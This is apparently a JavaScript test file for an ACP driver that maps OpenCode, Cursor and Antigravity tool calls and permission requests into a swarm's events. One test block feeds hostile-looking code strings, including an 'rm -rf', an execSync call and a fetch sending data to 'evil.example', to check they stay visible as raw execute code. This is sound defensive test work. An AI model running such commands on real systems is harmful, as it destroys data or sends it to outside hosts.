// The ACP driver (backends/acp.js) without a server: a real OpenCode turn recorded during the design
// (test/fixtures/acp-opencode-turn.jsonl: two shell calls, each asking for permission, then a reply and usage) replayed
// through the driver with a stand-in agent. Checks what the driver writes and the swarm events it makes. The recording
// has the agent's request id 1 next to our own request id 1 (initialize), which must not be confused.
import fs from 'node:fs';
import path from 'node:path';
import { ROOT, checker } from './lib/spare.mjs';
import { createAcpBackend, toolOf } from '../src/backends/acp.js';
import { antigravity } from '../src/backends/antigravity.js';

const c = checker(), ok = c.ok;
const lines = fs.readFileSync(path.join(ROOT, 'test/fixtures/acp-opencode-turn.jsonl'), 'utf8').split('\n').filter(Boolean);
const be = createAcpBackend({ id: 'oc', label: 'OC', bin: 'opencode', capabilities: {}, launch: () => ({ args: [], env: {} }) });

const writes = [], events = [], asked = [];
const agent = {
  cwd: '/work/proj',
  writeIn: (l) => writes.push(JSON.parse(l)),
  autoDecision: () => null,
  requestPermission: (req) => { asked.push(req); return Promise.resolve({ allowed: true, decision: 'allow' }); },
  saveDriverState() {}, push: (e) => events.push(e), setStatus() {},
};
const d = be.driver(agent, null, { mcpServers: { swarm: { command: 'node', args: ['swarm-mcp.js'], env: { HALAY_AGENT: 'a1' } } } });
for (const l of d.started()) writes.push(JSON.parse(l));
const feed = (l) => { for (const e of d.onLine(l)) events.push(e); };

feed(lines[0]); // initialize response (id 1)
ok(writes[0].method === 'initialize' && writes[0].id === 1, 'starts with initialize');
ok(writes[1]?.method === 'session/new' && writes[1].params.mcpServers[0].name === 'swarm' && writes[1].params.mcpServers[0].env[0].name === 'HALAY_AGENT', 'then session/new with the MCP servers in ACP form');
feed(lines[1]); // session/new response
ok(d.encode('run the commands') === null && writes.at(-1).method === 'session/prompt' && writes.at(-1).params.prompt[0].text === 'run the commands', 'a message becomes session/prompt once the session exists');
const promptId = writes.at(-1).id;
for (const l of lines.slice(2)) feed(l);
await new Promise((r) => setImmediate(() => setImmediate(r)));

ok(asked.length === 2 && asked[0].tool_name === 'Bash' && asked[0].input.command === 'cat a.txt 2>&1 | head -20', 'both permission requests reach the swarm as Bash calls: ' + JSON.stringify(asked.map((a) => a.input)));
const answers = writes.filter((w) => w.result?.outcome);
ok(answers.length === 2 && answers[0].id === 0 && answers[1].id === 1 && answers.every((a) => a.result.outcome.optionId === 'once'), 'the answers go back with the agent\'s own request ids (0 and 1), as allow_once');
ok(!writes.some((w) => w.method === 'session/new' && w.id !== 2), 'the agent\'s request id 1 is not mistaken for the initialize response');
const tools = events.filter((e) => e.type === 'assistant' && e.message.content[0].type === 'tool_use').map((e) => e.message.content[0]);
ok(tools.length === 2 && tools[1].input.command === 'echo -n "bye" > b.txt' && tools[0]._acp.kind === 'execute', 'two tool_use events with their commands');
const results = events.filter((e) => e.type === 'user').map((e) => e.message.content[0]);
ok(results.length === 2 && results[0].content === 'hello\n' && results[1].content === '(no output)' && !results[0].is_error, 'two tool_result events with the output');
ok(events.some((e) => e.type === 'system' && e.subtype === 'context' && e.used === 6705 && e.size === 200000), 'usage_update gives the context size');
const res = events.find((e) => e.type === 'result');
ok(res && res.subtype === 'success' && res.usage.input_tokens === 33 && res.usage.output_tokens === 11 && res.usage.cache_read_input_tokens === 6672 && res.total_cost_usd === 0, 'the prompt response is a result with usage and cost: ' + JSON.stringify(res));
ok(res.session_id === 'ses_e6712cd7affexEgBz3KVequVps', 'events carry the ACP session id');
ok(promptId === 3 && d.state().prompting === null && Object.keys(d.state().calls).length === 0, 'no request left in flight');
const saved = JSON.stringify(d.state());
ok(JSON.parse(saved).session === res.session_id, 'the state is plain JSON (saved for a server restart)');

// tool mapping
ok(toolOf({ kind: 'edit', content: [{ type: 'diff', path: '/a', oldText: 'x', newText: 'y' }] }).name === 'Edit', 'a diff with old text is an Edit');
ok(toolOf({ kind: 'edit', content: [{ type: 'diff', path: '/a', oldText: null, newText: 'y' }] }).name === 'Write', 'a diff without old text is a Write');
ok(toolOf({ kind: 'read', locations: [{ path: '/r' }] }).input.file_path === '/r', 'a read takes its path from the locations');
ok(toolOf({ kind: 'other', title: 'swarm_list_agents', rawInput: { a: 1 } }).name === 'swarm_list_agents', 'other tools keep their title as name');
// Cursor's MCP calls (seen live, cursor-agent 2026.10): "<server>-<tool>: <tool>", rawInput {providerIdentifier, toolName, args}
const cm = toolOf({ kind: 'other', title: 'swarm-list_agents: list_agents', rawInput: { providerIdentifier: 'swarm', toolName: 'list_agents', args: { all: true } } });
ok(cm.name === 'mcp__swarm__list_agents' && cm.input.all === true, "Cursor's MCP call is named mcp__<server>__<tool>, with its args as input");
ok(toolOf({ kind: 'other', title: 'probe-ping: ping' }).name === 'mcp__probe__ping', 'also from the title alone');

// OpenCode 2.2's execute tool: MCP tools called from code (seen live: kind other, title execute, rawInput { code })
const ex = (code) => toolOf({ kind: 'other', title: 'execute', rawInput: { code } });
const sa = ex("return await tools.swarm.start_agent({ name: 'docs', cwd: \"/w\", prompt: `Fix the docs, for each page do:\n- check`, worktree: true, n: -2.5, tags: ['a', \"b\"], x: null, });");
ok(sa.name === 'mcp__swarm__start_agent' && sa.viaCode && JSON.stringify(sa.input) === JSON.stringify({ name: 'docs', cwd: '/w', prompt: 'Fix the docs, for each page do:\n- check', worktree: true, n: -2.5, tags: ['a', 'b'], x: null }), 'one call with literal arguments shows as that MCP tool, with them as input: ' + JSON.stringify(sa));
ok(ex('const a = await tools.swarm.list_agents();\nreturn a;').name === 'mcp__swarm__list_agents' && JSON.stringify(ex('return tools.swarm.list_agents()').input) === '{}', 'a call without arguments has an empty input');
ok(ex("return tools.swarm.send_message({ agent_id: 'x', message: 'it\\'s \\u00e9 // ok' /* note */ })").input.message === "it's é // ok", 'string escapes and comments');
const multi = 'const a = await tools.swarm.list_agents();\nconst r = await tools.swarm.list_rooms();\nreturn { agents: a, rooms: r };'; // recorded live
ok(ex(multi).name === 'execute' && ex(multi).input.code === multi && !ex(multi).viaCode, 'several calls stay an execute card with the code');
ok(ex("for (const id of ['a', 'b']) await tools.swarm.send_message({ agent_id: 'a', message: 'hi' });").name === 'execute', 'a call in a loop stays execute');
ok(ex("return ['a'].map((id) => tools.swarm.send_message({ agent_id: id }))").name === 'execute', 'a call with a value from the code stays execute');
ok(ex('const id = "a"; return tools.swarm.read_agent({ agent_id: id });').name === 'execute', 'a variable as argument stays execute');
ok(ex('return tools.swarm.send_message({ message: `hi ${who}` })').name === 'execute', 'a template with values stays execute');
ok(ex('return 1 + 1').name === 'execute', 'code without tool calls stays execute');
// the card shows only the call: code doing anything else around it must stay an execute card with all of it
for (const code of [
  "await tools.swarm.list_agents({}); await Bun.spawn(['rm', '-rf', 'x']);",
  "require('child_process').execSync('id'); return tools.swarm.list_agents()",
  "const a = await tools.swarm.list_agents(); fetch('https://evil.example/?d=' + a); return a;",
  "return evil() || tools.swarm.list_agents()",
  "const a = await tools.swarm.list_agents(); return b;",
  "x = 1; /* hi */ return tools.swarm.list_agents()",
]) ok(ex(code).name === 'execute' && !ex(code).viaCode && ex(code).input.code === code, 'code around the call stays execute: ' + code);
ok(ex('// list them\nconst r = await tools.swarm.list_agents(); /* done */\nreturn r;').name === 'mcp__swarm__list_agents', 'comments and returning the result are fine');
ok(toolOf({ kind: 'execute', title: 'tools.swarm.list_agents()', rawInput: { command: 'echo' } }).name === 'Bash', "a shell call (ACP kind execute) is still Bash");

// in the driver: the card shows the swarm tool, but a permission request for that code is decided as execute
const decided = [];
agent.autoDecision = (name) => { decided.push(name); return 'allow'; };
const sid = res.session_id, upd = (u) => feed(JSON.stringify({ jsonrpc: '2.0', method: 'session/update', params: { sessionId: sid, update: u } }));
const code1 = "return await tools.swarm.start_agent({ name: 'w', prompt: 'go' });";
upd({ sessionUpdate: 'tool_call', toolCallId: 'ex1', name: 'execute', title: 'execute', kind: 'other', status: 'pending', locations: [], rawInput: {} });
feed(JSON.stringify({ jsonrpc: '2.0', id: 77, method: 'session/request_permission', params: { sessionId: sid, toolCall: { toolCallId: 'ex1', kind: 'other', title: 'execute', rawInput: { code: code1 } }, options: [{ optionId: 'once', kind: 'allow_once', name: 'Allow' }] } }));
upd({ sessionUpdate: 'tool_call_update', toolCallId: 'ex1', status: 'completed', content: [{ type: 'content', content: { type: 'text', text: 'started w' } }] });
const exUse = events.map((e) => e.message?.content?.[0]).find((b) => b?.type === 'tool_use' && b.id === 'ex1');
ok(exUse?.name === 'mcp__swarm__start_agent' && exUse.input.name === 'w' && !('viaCode' in exUse), 'the execute call shows as mcp__swarm__start_agent with its arguments: ' + JSON.stringify(exUse));
ok(decided.at(-1) === 'execute', 'the swarm decides on it as execute: ' + decided);
ok(writes.some((w) => w.id === 77 && w.result?.outcome?.optionId === 'once'), 'and answers the request');
// ---- Antigravity (agy acp 1.4.12): its tool shapes as recorded (rawInput with capitalized keys, MCP tools flattened to mcp_<server>_<tool>)
const W = '/work/proj';
const run = toolOf({ name: 'run_command', kind: 'execute', title: 'echo acpshell', rawInput: { CommandLine: 'echo acpshell', WaitMsBeforeAsync: 5000, toolSummary: 'Echo acpshell test' } });
ok(run.name === 'Bash' && run.input.command === 'echo acpshell', "run_command's CommandLine is the Bash command (not only the title): " + JSON.stringify(run));
ok(toolOf({ name: 'run_command', kind: 'execute', title: 'a shortened title', rawInput: { CommandLine: 'ls -la /tmp' } }).input.command === 'ls -la /tmp', 'even when the title differs from it');
const wf = toolOf({ name: 'write_file', kind: 'edit', title: 'File acp.txt', locations: [{ path: W + '/acp.txt' }], rawInput: { Content: 'hi\n', Path: W + '/acp.txt' } });
ok(wf.name === 'Write' && wf.input.file_path === W + '/acp.txt' && wf.input.content === 'hi\n', 'write_file { Path, Content } (no diff yet) is a Write with that path and content: ' + JSON.stringify(wf));
const ef = toolOf({ name: 'edit_file', kind: 'edit', title: 'File note.txt', locations: [{ path: W + '/note.txt' }], rawInput: { Path: W + '/note.txt', Replacement: 'baz', Target: 'foo' } });
ok(ef.name === 'Edit' && ef.input.file_path === W + '/note.txt' && ef.input.old_string === 'foo' && ef.input.new_string === 'baz', 'edit_file { Path, Target, Replacement } is an Edit: ' + JSON.stringify(ef));
ok(toolOf({ name: 'read_file', kind: 'read', title: 'File note.txt', rawInput: { Path: W + '/note.txt' }, locations: [{ path: W + '/note.txt' }] }).input.file_path === W + '/note.txt', 'read_file { Path } is a Read of that path');
const sw = toolOf({ name: 'search_web', kind: 'search', title: '"site:example.com" on Web', rawInput: { query: 'site:example.com' } });
ok(sw.name === 'WebSearch' && sw.input.query === 'site:example.com', 'search_web is a WebSearch');
ok(toolOf({ kind: 'search', title: 'x', rawInput: { pattern: 'foo' } }).name === 'Grep', "another agent's search stays a Grep");
const mcp = (name, servers) => toolOf({ name, kind: 'other', title: 'Run ' + name, rawInput: { name: 'bob', toolSummary: 'Get magic number for bob' } }, { mcpServers: servers });
ok(mcp('mcp_swarm_list_agents', ['swarm']).name === 'mcp__swarm__list_agents', 'mcp_swarm_list_agents is halay\'s mcp__swarm__list_agents (so its own tools are recognised)');
ok(JSON.stringify(mcp('mcp_swarm_list_agents', ['swarm']).input) === '{"name":"bob"}', "with the arguments as input, without agy's own toolSummary note");
ok(mcp('mcp_my_server_do_it', ['swarm', 'my_server']).name === 'mcp__my_server__do_it', 'a server name with an underscore is resolved against the session\'s servers');
ok(mcp('mcp_my_server_do_it', ['swarm', 'my', 'my_server']).name === 'mcp__my_server__do_it', 'the longest matching server wins');
ok(mcp('mcp_tiny_get_magic_number', []).name === 'mcp__tiny__get_magic_number', 'with no server list the first word is the server');
ok(toolOf({ name: 'mcp_swarm_list_agents', kind: 'other', title: 'Run mcp_swarm_list_agents', rawInput: {} }).name === 'mcp__swarm__list_agents', 'also without a server list at all');
ok(toolOf({ name: 'manage_task', kind: 'other', title: 'Manage task', rawInput: { a: 1 } }).name === 'Manage task', 'an unknown tool stays a generic card under its title');

// its descriptor: launch, setup, capabilities, the system prompt hook
ok(antigravity.launch({ env: { A: '1' }, permissionMode: 'manual' }).args.join() === 'acp' && antigravity.launch({ env: { A: '1' }, permissionMode: 'manual' }).env.A === '1', 'launch: `agy acp` with the environment as it is');
ok(['manual', 'acceptEdits', 'bypassPermissions', 'cli'].every((m) => antigravity.launch({ env: {}, permissionMode: m }).args.join() === 'acp'), 'in every mode (it has no flag for any)');
ok(antigravity.launch({ env: {}, permissionMode: 'cli' }).cmd === 'agy', 'the binary is agy');
ok(JSON.stringify(antigravity.setup({ model: 'gemini-3.8-flash-low' })) === '[{"model":"gemini-3.8-flash-low"}]' && antigravity.setup({}).length === 0, 'setup: the model, through session/set_model');
const cap = antigravity.capabilities;
ok(!cap.modes.includes('plan') && cap.effort.length === 0 && cap.approvals && cap.resume && cap.mcp && cap.appendPrompt && !cap.questions && cap.usage.tokens && !cap.usage.cost && !cap.usage.context, 'capabilities as found');
ok(!antigravity.preamble && !antigravity.accountEnv && /OS keyring/.test(antigravity.noAccounts), 'no preamble (an appended prompt instead), no accounts');
ok(antigravity.newSessionMeta({ systemPrompt: 'be brief' }).antigravity.systemPrompt.append === 'be brief' && antigravity.newSessionMeta({}) === undefined, 'newSessionMeta: the instructions as _meta.antigravity.systemPrompt.append');
ok(/Agent Client Protocol/.test('Start the Agent Client Protocol (ACP) stdio server') && antigravity.probe.expect.test('Start the Agent Client Protocol (ACP) stdio server') && !antigravity.probe.expect.test('Usage: agy [flags]'), 'the probe tells an agy with an ACP server');
ok(antigravity.auth.parse('Fetching available models...\ngemini-3.8-flash-high\tGemini 3.8 Flash (High)\n', '').loggedIn === true && antigravity.auth.parse('', 'Error: Please sign in to view available models.').loggedIn === false, 'auth: models listed is logged in, "Please sign in" on stderr is logged out');

// the driver sends the hook's _meta in session/new and session/load, and not for a backend without the hook
const meta = (b, sessionId) => {
  const w = [];
  const dd = b.driver({ cwd: W, writeIn: (l) => w.push(JSON.parse(l)), autoDecision: () => null, requestPermission: async () => ({}), saveDriverState() {}, push() {}, setStatus() {} }, null, { systemPrompt: 'SWARM RULES', sessionId, mcpServers: { swarm: { command: 'node', args: ['x'], env: {} }, my_server: { command: 'node', args: ['y'] } } });
  dd.started();
  dd.onLine(JSON.stringify({ jsonrpc: '2.0', id: 1, result: { protocolVersion: 1, agentCapabilities: { loadSession: true } } }));
  return { sent: w.at(-1), driver: dd };
};
const mn = meta(antigravity);
ok(mn.sent.method === 'session/new' && mn.sent.params._meta.antigravity.systemPrompt.append === 'SWARM RULES' && mn.sent.params.mcpServers.length === 2, 'session/new carries the _meta next to cwd and mcpServers: ' + JSON.stringify(mn.sent.params._meta));
ok(meta(antigravity, 'abc').sent.method === 'session/load' && meta(antigravity, 'abc').sent.params._meta.antigravity.systemPrompt.append === 'SWARM RULES', 'and so does session/load');
ok(!('_meta' in meta(be).sent.params) && !('_meta' in meta(be, 'abc').sent.params), 'a backend without the hook sends none');
ok(JSON.stringify(mn.driver.state().mcp) === '["swarm","my_server"]', 'the driver keeps the session\'s MCP server names (in its saved state) for naming MCP tools');

c.done();
